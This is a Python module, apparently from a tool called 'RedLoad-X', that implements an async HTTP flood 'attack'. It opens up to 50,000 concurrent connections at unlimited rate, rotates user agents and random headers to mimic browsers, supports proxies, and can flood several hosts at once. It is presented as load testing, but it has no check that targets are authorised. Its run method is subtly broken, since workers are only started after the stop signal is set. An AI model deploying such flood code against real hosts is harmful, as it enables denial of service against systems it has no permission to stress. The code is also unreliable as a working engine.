"""
Async HTTP Engine for High-Scale RedLoad-X Testing
Provides asyncio-based HTTP flood with thousands of concurrent connections

Uses aiohttp for efficient async HTTP client with connection pooling.
Suitable for high-scale testing (10k+ RPS) with low resource usage.

Author: voltsparx
Contact: voltsparx@gmail.com
"""

import asyncio
import time
import random
import string
from typing import Dict, List, Optional, Callable
from collections import defaultdict

from .optional_deps import check_aiohttp_available, get_aiohttp_install_instructions

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
    AIOHTTP_ERROR = None
except ImportError as e:
    AIOHTTP_AVAILABLE = False
    AIOHTTP_ERROR = str(e)


class AsyncHTTPMetrics:
    """Track async HTTP attack metrics"""
    
    def __init__(self):
        self.requests_sent = 0
        self.requests_success = 0
        self.requests_failed = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        self.status_codes = defaultdict(int)
        self.response_times = []
        self.errors = defaultdict(int)
        self.lock = asyncio.Lock()
    
    async def record_request(
        self,
        success: bool,
        status_code: Optional[int] = None,
        response_time: float = 0.0,
        bytes_sent: int = 0,
        bytes_received: int = 0,
        error: Optional[str] = None
    ):
        """Record request metrics"""
        async with self.lock:
            self.requests_sent += 1
            
            if success:
                self.requests_success += 1
                if status_code:
                    self.status_codes[status_code] += 1
                self.response_times.append(response_time)
            else:
                self.requests_failed += 1
                if error:
                    self.errors[error] += 1
            
            self.bytes_sent += bytes_sent
            self.bytes_received += bytes_received


class AsyncHTTPFlood:
    """
    High-performance async HTTP flood attack
    
    Uses asyncio and aiohttp for efficient concurrent HTTP requests.
    Suitable for load testing and stress testing HTTP servers.
    
    Attributes:
        host: Target hostname
        port: Target port
        target_rps: Target requests per second
        concurrent_connections: Number of concurrent connections
        metrics: AsyncHTTPMetrics instance
    """
    
    # Default realistic user agents
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Mobile Safari',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0',
    ]
    
    def __init__(
        self,
        host: str,
        port: int,
        target_rps: Optional[float] = None,
        concurrent_connections: int = 100,
        use_https: bool = False,
        proxies: Optional[Dict] = None
    ):
        """
        Initialize async HTTP flood
        
        Args:
            host: Target hostname
            port: Target port
            target_rps: Target requests per second (None = unlimited)
            concurrent_connections: Number of concurrent connections
            use_https: Use HTTPS (default: False)
            proxies: Proxy configuration
        
        Raises:
            ImportError: If aiohttp is not installed
            ValueError: If configuration is invalid
        """
        if not AIOHTTP_AVAILABLE:
            raise ImportError(
                f"aiohttp library is required for AsyncHTTPFlood but is not installed.\n"
                f"Original error: {AIOHTTP_ERROR}\n"
                f"{get_aiohttp_install_instructions()}"
            )
        
        # Validate input parameters
        if not isinstance(port, int) or port < 1 or port > 65535:
            raise ValueError(f"port must be integer 1-65535, got {port}")
        
        if target_rps is not None and (not isinstance(target_rps, (int, float)) or target_rps <= 0):
            raise ValueError(f"target_rps must be positive number or None, got {target_rps}")
        
        if concurrent_connections < 1 or concurrent_connections > 50000:
            raise ValueError(f"concurrent_connections must be 1-50000, got {concurrent_connections}")
        
        self.host = host
        self.port = port
        self.target_rps = target_rps
        self.concurrent_connections = concurrent_connections
        self.scheme = "https" if use_https else "http"
        self.proxies = proxies
        self.metrics = AsyncHTTPMetrics()
        self.stop_event = asyncio.Event()
    
    async def _send_request(self, session: aiohttp.ClientSession) -> None:
        """Send single HTTP request"""
        url = f"{self.scheme}://{self.host}:{self.port}/"
        
        # Randomize headers
        headers = {
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Requested-With': f'{"".join(random.choices(string.ascii_letters, k=8))}',
        }
        
        start_time = time.time()
        try:
            async with session.get(
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False,
                proxy=self.proxies.get('http') if self.proxies else None
            ) as resp:
                response_time = (time.time() - start_time) * 1000
                body = await resp.read()
                
                await self.metrics.record_request(
                    success=True,
                    status_code=resp.status,
                    response_time=response_time,
                    bytes_sent=len(url) + sum(len(k) + len(v) for k, v in headers.items()),
                    bytes_received=len(body)
                )
        
        except asyncio.TimeoutError:
            response_time = (time.time() - start_time) * 1000
            await self.metrics.record_request(
                success=False,
                response_time=response_time,
                error="TIMEOUT"
            )
        
        except aiohttp.ClientError as e:
            response_time = (time.time() - start_time) * 1000
            await self.metrics.record_request(
                success=False,
                response_time=response_time,
                error=str(type(e).__name__)
            )
        
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            await self.metrics.record_request(
                success=False,
                response_time=response_time,
                error=f"ERROR: {str(e)[:20]}"
            )
    
    async def _worker(self, session: aiohttp.ClientSession) -> None:
        """Worker coroutine that sends requests"""
        request_interval = 1.0 / self.target_rps if self.target_rps else 0
        next_request_time = time.time()
        
        while not self.stop_event.is_set():
            # Rate limiting
            if request_interval > 0:
                now = time.time()
                wait_time = next_request_time - now
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
                next_request_time += request_interval
            
            # Send request
            try:
                await self._send_request(session)
            except Exception as e:
                await self.metrics.record_request(
                    success=False,
                    error=f"WORKER_ERROR: {str(e)[:20]}"
                )
    
    async def run(self, duration: float) -> AsyncHTTPMetrics:
        """
        Run async HTTP flood attack
        
        Args:
            duration: Attack duration in seconds
        
        Returns:
            AsyncHTTPMetrics with results
        
        Raises:
            ValueError: If duration is invalid
            aiohttp.ClientError: If connection fails
        """
        if not isinstance(duration, (int, float)) or duration <= 0:
            raise ValueError(f"duration must be positive number, got {duration}")
        
        try:
            connector = aiohttp.TCPConnector(
                limit=self.concurrent_connections,
                limit_per_host=self.concurrent_connections,
                ttl_dns_cache=300
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Schedule workers
                workers = [
                    self._worker(session)
                    for _ in range(self.concurrent_connections)
                ]
                
                # Run for specified duration
                try:
                    await asyncio.sleep(duration)
                except asyncio.CancelledError:
                    pass
                finally:
                    self.stop_event.set()
                    
                    # Wait for workers to finish
                    await asyncio.gather(*workers, return_exceptions=True)
            
            return self.metrics
        
        except aiohttp.ClientConnectorError as e:
            raise RuntimeError(
                f"Failed to connect to {self.scheme}://{self.host}:{self.port}: {e}"
            ) from e
        except aiohttp.ClientError as e:
            raise RuntimeError(
                f"Client error during async HTTP flood: {e}"
            ) from e
        except Exception as e:
            raise RuntimeError(
                f"Unexpected error in async HTTP flood: {e}"
            ) from e


class AsyncEngineCoordinator:
    """
    Coordinates async HTTP attacks with multiple instances
    
    Allows parallel async flood attacks targeting different hosts
    or using different configurations.
    """
    
    def __init__(self):
        self.floods = []
    
    def add_flood(
        self,
        host: str,
        port: int,
        target_rps: Optional[float] = None,
        concurrent_connections: int = 100,
        use_https: bool = False,
        proxies: Optional[Dict] = None
    ) -> AsyncHTTPFlood:
        """
        Add async HTTP flood instance
        
        Args:
            host: Target hostname
            port: Target port
            target_rps: Target RPS (None = unlimited)
            concurrent_connections: Number of concurrent connections
            use_https: Use HTTPS
            proxies: Proxy config
        
        Returns:
            AsyncHTTPFlood instance
        
        Raises:
            ImportError: If aiohttp not available
            ValueError: If configuration invalid
        """
        try:
            flood = AsyncHTTPFlood(
                host,
                port,
                target_rps,
                concurrent_connections,
                use_https,
                proxies
            )
            self.floods.append(flood)
            return flood
        except ImportError as e:
            raise ImportError(f"Cannot add flood: {e}") from e
        except ValueError as e:
            raise ValueError(f"Invalid flood configuration: {e}") from e
    
    async def run_all(self, duration: float) -> List[AsyncHTTPMetrics]:
        """
        Run all floods concurrently
        
        Args:
            duration: Duration in seconds
        
        Returns:
            List of metrics from each flood
        
        Raises:
            ValueError: If no floods added or duration invalid
            RuntimeError: If attack execution fails
        """
        if not self.floods:
            raise ValueError("No floods configured. Use add_flood() first.")
        
        if not isinstance(duration, (int, float)) or duration <= 0:
            raise ValueError(f"duration must be positive number, got {duration}")
        
        try:
            tasks = [flood.run(duration) for flood in self.floods]
            results = await asyncio.gather(*tasks, return_exceptions=False)
            return results
        except Exception as e:
            raise RuntimeError(f"Error running concurrent floods: {e}") from e


__all__ = ['AsyncHTTPFlood', 'AsyncHTTPMetrics', 'AsyncEngineCoordinator']
